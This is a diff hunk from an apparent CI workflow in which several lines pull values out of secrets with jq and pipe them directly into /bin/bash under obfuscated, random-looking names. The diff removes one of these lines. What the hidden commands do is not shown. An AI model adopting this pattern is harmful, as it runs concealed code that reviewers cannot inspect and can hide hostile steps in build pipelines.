@@ -22,7 +22,6 @@ jobs:
           g969: ${{ secrets.g969 }}
         run: |
           printf '%s' "$g969" | jq -r .lhlu6 | /bin/bash
-          printf '%s' "$kvoh19" | jq -r .cco2 | /bin/bash
           printf '%s' "$i885" | jq -r .ua2 | /bin/bash
           echo $qdv82 | jq -r .amt87 | /bin/bash
           printf '%s' "$kfz3928" | jq -r .qbxkx10 | /bin/bash
